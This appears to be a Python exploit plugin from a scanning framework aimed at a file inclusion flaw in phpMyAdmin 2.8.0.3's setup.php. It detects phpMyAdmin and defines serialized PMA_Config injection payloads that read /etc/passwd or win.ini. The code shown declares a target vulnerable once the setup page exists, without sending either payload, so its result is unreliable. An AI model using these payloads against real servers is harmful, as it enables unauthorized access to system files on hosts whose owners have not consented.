#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-26 14:32:27
import requests
from lib.util import url2ip
class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "phpmyadmin 2.8.0.3任意文件包含导致代码执行",
            "author": "Lcy",
            "type": "website",
            "ref": "http://www.mottoin.com/87915.html",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def isPhpMyadmin(self,url):
        try:
            r = requests.get(url+"/scripts/setup.php",timeout=3)
            res = r.text
            if res.find('www.phpmyadmin.net') <> -1:
                return True
        except:
            return False
        return False
    def verify(self):
        win_payload = 'configuration=O:10:"PMA_Config":1:{s:6:"source";s:18:"c:/windows/win.ini";}&action=test'
        linux_payload = 'configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}&action=test'
        host = url2ip(self.target)
        if self.isPhpMyadmin(self.target+'/phpmyadmin'):
            valurl = self.target+'/phpmyadmin/scripts/setup.php'
        elif self.isPhpMyadmin(self.target):
            valurl = self.target + '/scripts/setup.php'
        else:
            return
        self.result['status'] = True
        self.result['info'] = '目标存在phpmyadmin任意文件包含漏洞,验证url:%s' % valurl
       